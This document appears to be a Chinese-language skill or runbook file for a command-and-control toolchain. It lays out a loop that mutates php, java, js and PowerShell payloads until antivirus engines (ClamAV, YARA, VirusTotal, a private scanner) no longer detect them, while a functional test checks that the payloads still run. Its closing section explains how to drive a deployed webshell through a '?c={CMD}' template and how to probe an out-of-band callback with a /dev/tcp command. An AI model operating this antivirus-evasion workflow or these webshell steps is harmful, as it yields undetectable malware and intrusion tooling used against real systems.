---
name: qa-loop
description: 面杀 Q&A 循环——引擎适配·功能门·迭代·一次性绑定交付
---

# 面杀 Q&A(线三,/opt/tools/bin/c2-qa.py v2)
引擎集=scope.json 配置;私架优先,公网最小化(样本外流风险逐级评估)。

## 循环协议(v2 功能门版,纪律:功能丢=失败不算通过)
1. 扫当前样本 → 全引擎 clean → **交付终验**:c2-functest + c2-bind verify,双过才 PASS
2. 任一引擎报 → `c2-variant.py gen --families decomp,id,struct --rounds 4` 出候选
3. 候选逐个过**功能门**(c2-functest)→ 弃废件;功能过且引擎 clean → 采用;
   功能过但残留 → 记最佳下轮续打;全弃 → 本轮空转(如实)
4. 8 轮未全过 → 最佳变体+残留明细+建议,如实交付,不硬凑
5. AV-clean 但 functest fail → rc=1,report.json verdict=AV-CLEAN-FUNCTEST-FAIL(残骸留痕)

## 引擎适配器
| 引擎 | 依赖 | 用法 |
|---|---|---|
| clamav / yara | 本地零依赖 | `--engines clamav,yara` |
| private(私架) | `PRIVATE_QA_URL`+`PRIVATE_QA_TOKEN` | `--engines private`;契约见下 |
| threatbook / vt | API key(THREATBOOK_API_KEY/VT_API_KEY) | 未实现适配器前按此声明拒绝,勿静默 |

私架契约(样例 /opt/tools/c2/mock/private-qa-server.py):
```
POST {PRIVATE_QA_URL}  multipart 字段 sample;头 X-SPECTRE-Token
响应 {"detected":bool,"signature":"...","engine":"..."}
```
联调:`python3 /opt/tools/c2/mock/private-qa-server.py 8899` 然后
`PRIVATE_QA_URL=http://127.0.0.1:8899/scan PRIVATE_QA_TOKEN=spectre-mock-token c2-qa.py scan ...`
真私架=同契约换实现,c2-qa 侧零改动。接入顺序:本地→私架→微步→VT(每级先问样本外流是否必要)。

## 交付包(DELIVERY/)
载荷 + report.json(rounds/引擎矩阵/sha256/functest/binding)+ 载荷.bind.json(一次性绑定)
交付自动 `c2-bind.py bind`(默认 scope 目标,exp=窗口 end)并 verify;过期/越界=拒绝交付。

## 功能验证金字塔(c2-functest.py v2)
| 语言 | 语法层 | 运行层 |
|---|---|---|
| php | php -l | php 实跑回显含标记(基线无回显的 callback 型按契约 OK-static) |
| java | javac(-encoding UTF-8,桩 cp=/opt/tools/c2/javastubs/classes,sun.misc 依赖走 --patch-module jdk.unsupported=patchsrc,类名从解转义源码提取) | 需容器,止于编译级 |
| js | - | node + /opt/tools/c2/jsshim/wsh-shim.js(ProgID 记录+echo 含标记;`this[...]` 计算成员改写在此实证) |
| ps | - | pwsh -NoProfile -File,stdout 含标记(承重自证契约) |

陷阱(实测):任何对变体源的检测先做 `\uXXXX` 解转义再判定,否则被自己的改写骗过。

## 回归纪律
工具链任何改动后:`c2-variant.py selftest` 10/10;必要时全基型 `c2-qa.py run --engines yara --max-rounds 8` 复跑。

## 运营侧指标(2026-09 benchmark 标定,R2 定稿)
- 双指标:面杀通过率(引擎集内)+功能守恒率(RT 级:真 register/触发/回显)——单指标全绿不算数
- 平均轮次:≤2.5(当前 2.0);轮次飙升=变换族退化信号
- 泛化探针:holdout 独立矩阵残留率(当前 6/10,公共语料配置 5/10)——训练矩阵全绿+holdout 高残留=背题,禁止为 holdout 加规则
- 边界台账:字节码族不可及结构面(implements/类型引用)如实在账;缓期项(真引擎 key/EXE 车道/行为级)每项带理由与解冻条件
- 审计行数单调递增=纪律存续;一次性绑定 verify 通过率=100%(交付即绑)

## 通道实操指引(2026-09 终局复盘补)
- web 通道一键导入:已验证 webshell URL 形如 `http://h/p.php?c=<原样>` →
  register 时把命令参数位换成 {CMD} 即模板(如 `...?c={CMD}`);响应有页面
  噪声则尾部加 `#MK` 定界。目标自身输出干净时 curl 直发也合规(审计走台账)
- OOB 19999 拓扑核验(逐 VM 必测,勿默认可达):qemu user-net 网关=10.0.2.2
  (宿主回环可达);自定义 netns 容器靶可能不可达——开战先发探针
  `echo probe > /dev/tcp/<gw>/19999` 收到回执再用;不可达则走落盘+通道读
